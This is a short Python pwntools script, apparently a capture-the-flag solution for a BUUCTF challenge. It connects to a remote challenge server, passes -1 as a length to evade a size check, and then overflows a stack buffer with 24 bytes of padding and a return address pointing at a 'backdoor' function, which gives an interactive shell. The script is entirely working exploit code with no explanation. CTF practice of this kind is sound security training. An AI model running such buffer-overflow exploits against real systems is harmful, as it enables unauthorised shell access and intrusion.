from pwn import *
#sh = process("./bjdctf")
sh = remote("node5.buuoj.cn",29385)
sh.recvuntil(b"name:\n")
sh.sendline(b"-1")
backdoor = 0x0400726
sh.recvuntil(b"name?\n")
payload = b"A"*(0x10+0x8)+p64(backdoor)
sh.sendline(payload)
sh.interactive()
